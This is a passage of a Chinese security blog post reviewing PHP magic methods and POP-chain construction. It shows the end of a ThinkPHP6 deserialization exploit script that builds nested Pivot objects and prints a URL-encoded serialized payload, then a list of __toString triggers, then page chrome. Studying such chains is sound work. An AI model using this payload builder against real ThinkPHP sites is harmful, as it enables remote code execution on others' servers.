getAttr的参数$name即为$key,$filename=$name=&gt;$key,if判断条件成立返回$this-&gt;data[$fieldName]=&gt;$this-&gt;data[$key]</span></span><br><span class="line"><span class="comment">//getAttr返回$this-&gt;getValue($key,$value,$relation)</span></span><br><span class="line"><span class="comment">//getValue利用点 $value   = $closure($value, $this-&gt;data)动态函数调用</span></span><br><span class="line"><span class="comment">// $this-&gt;withAttr[$fieldName]为调用函数，$filedName不为数组，$value为参数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($obs = <span class="string">''</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lazySave = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exists = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;withEvent = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;force = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;table = $obs;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Pivot();</span><br><span class="line">$b = <span class="keyword">new</span> Pivot($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="魔术方法补充"><a href="#魔术方法补充" class="headerlink" title="魔术方法补充"></a>魔术方法补充</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__toString触发条件：</span><br><span class="line"><span class="keyword">echo</span> ($obj) / <span class="keyword">print</span>($obj) 打印时会触发</span><br><span class="line">字符串连接时</span><br><span class="line">格式化字符串时</span><br><span class="line">与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）</span><br><span class="line">格式化SQL语句，绑定参数时</span><br><span class="line">数组中有字符串时</span><br><span class="line">php字符串处理函数</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="Peguin WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Peguin Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Peguin
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/" title="php魔术方法及pop链构造">http://yoursite.com/2021/01/19/php魔术方法及pop链构造/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/2.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/review/" rel="tag"># review</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/01/15/Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="prev" title="Yii框架反序列化漏洞">
+      <i class="fa fa-chevron-left"></i> Yii框架反序列化漏洞
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/01/23/sql%E6%B3%A8%E5%85%A5review/" rel="next" title="sql注入review">
+      sql注入review <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  <div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#序列化知识点整理"><span class="nav-number">1.</span> <span class="nav-text">序列化知识点整理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#核心部分：php魔术方法"><span class="nav-number">1.1.</span> <span class="nav-text">核心部分：php魔术方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反序列化与pop链"><span class="nav-number">1.2.</span> <span class="nav-text">反序列化与pop链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php序列化处理器"><span class="nav-number">1.3.</span> <span class="nav-text">php序列化处理器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#审计pop链的思路"><span class="nav-number">1.4.</span> <span class="nav-text">审计pop链的思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#以yii5-7和thinkphp6pop链为例"><span class="nav-number">1.5.</span> <span class="nav-text">以yii5.7和thinkphp6pop链为例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#魔术方法补充"><span class="nav-number">1.6.</span> <span class="nav-text">魔术方法补充</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Peguin"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">Peguin</p>
+  <div class="site-description" itemprop="description">敢于去想，才会有MEteor的光芒闪耀。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">87</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">40</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ambitiousleader/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ambitiousleader&#x2F;" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/601209387@qq.com" title="E-Mail → 601209387@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/6772435317/home?wvr=5&sudaref=graph.qq.com" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;6772435317&#x2F;home?wvr&#x3D;5&amp;sudaref&#x3D;graph.qq.com" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Peguin</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/fireworks.js"></script>
+  
+
+
+</body>
+</html>
